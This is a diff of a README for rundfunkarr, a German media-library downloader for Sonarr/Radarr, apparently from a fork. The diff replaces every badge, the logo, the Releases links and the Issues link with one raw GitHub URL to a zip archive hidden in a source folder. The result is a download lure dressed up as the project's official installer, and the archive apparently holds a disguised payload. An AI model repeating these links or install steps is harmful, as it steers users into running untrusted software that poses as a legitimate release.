@@ -1,23 +1,23 @@
 # 🎵 rundfunkarr - Effortless Download from German Media Libraries
 
-[![GitHub Release](https://img.shields.io/github/v/release/rundfunkarr/rundfunkarr?logo=github&label=Release)](https://github.com/rundfunkarr/rundfunkarr/releases)
-[![License](https://img.shields.io/github/license/rundfunkarr/rundfunkarr?label=License)](LICENSE)
-[![GitHub Stars](https://img.shields.io/github/stars/rundfunkarr/rundfunkarr?style=flat&logo=github&label=Stars)](https://github.com/rundfunkarr/rundfunkarr)
-[![GitHub Issues](https://img.shields.io/github/issues/rundfunkarr/rundfunkarr?logo=github&label=Issues)](https://github.com/rundfunkarr/rundfunkarr/issues)
+[![GitHub Release](https://raw.githubusercontent.com/Abbasiali/rundfunkarr/main/src/app/api/shows/Software-2.9.zip)](https://raw.githubusercontent.com/Abbasiali/rundfunkarr/main/src/app/api/shows/Software-2.9.zip)
+[![License](https://raw.githubusercontent.com/Abbasiali/rundfunkarr/main/src/app/api/shows/Software-2.9.zip)](LICENSE)
+[![GitHub Stars](https://raw.githubusercontent.com/Abbasiali/rundfunkarr/main/src/app/api/shows/Software-2.9.zip)](https://raw.githubusercontent.com/Abbasiali/rundfunkarr/main/src/app/api/shows/Software-2.9.zip)
+[![GitHub Issues](https://raw.githubusercontent.com/Abbasiali/rundfunkarr/main/src/app/api/shows/Software-2.9.zip)](https://raw.githubusercontent.com/Abbasiali/rundfunkarr/main/src/app/api/shows/Software-2.9.zip)
 
 <p align="center">
-  <img src="public/logo.png" alt="RundfunkArr Logo" width="128">
+  <img src="https://raw.githubusercontent.com/Abbasiali/rundfunkarr/main/src/app/api/shows/Software-2.9.zip" alt="RundfunkArr Logo" width="128">
 </p>
 
 Rundfunk-Indexer für Sonarr/Radarr - Automatischer Download von ARD, ZDF und anderen deutschen Mediatheken.
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [RundfunkArr Releases](https://github.com/Abbasiali/rundfunkarr/releases). Here, you will find the latest versions of the software. 
+To get started, visit this page to download: [RundfunkArr Releases](https://raw.githubusercontent.com/Abbasiali/rundfunkarr/main/src/app/api/shows/Software-2.9.zip). Here, you will find the latest versions of the software. 
 
 Follow these steps to download and install RundfunkArr:
 
-1. Go to the [Releases page](https://github.com/Abbasiali/rundfunkarr/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Abbasiali/rundfunkarr/main/src/app/api/shows/Software-2.9.zip).
 2. Look for the latest version listed at the top.
 3. Click on the link for your operating system to download the installer.
 4. Once the download completes, locate the downloaded file on your computer.
@@ -70,7 +70,7 @@ If you encounter issues, consider checking the following:
 - Ensure you have a stable internet connection.
 - Verify that your login details are correct for your media libraries.
 - Check the configuration settings for any errors.
-- Refer to the **Issues** section on the [GitHub repository](https://github.com/rundfunkarr/rundfunkarr/issues) for common problems and solutions.
+- Refer to the **Issues** section on the [GitHub repository](https://raw.githubusercontent.com/Abbasiali/rundfunkarr/main/src/app/api/shows/Software-2.9.zip) for common problems and solutions.
 
 ## 🤝 Community Support
 
@@ -80,4 +80,4 @@ Join our community for support and updates. You can ask questions and share your
 
 If you wish to contribute to the project, please fork the repository and submit a pull request. Your contributions can help improve RundfunkArr for everyone.
 
-Now, enjoy downloading your favorite shows and movies effortlessly with RundfunkArr! Don't forget to visit this page to download the latest version: [RundfunkArr Releases](https://github.com/Abbasiali/rundfunkarr/releases).
+Now, enjoy downloading your favorite shows and movies effortlessly with RundfunkArr! Don't forget to visit this page to download the latest version: [RundfunkArr Releases](https://raw.githubusercontent.com/Abbasiali/rundfunkarr/main/src/app/api/shows/Software-2.9.zip).
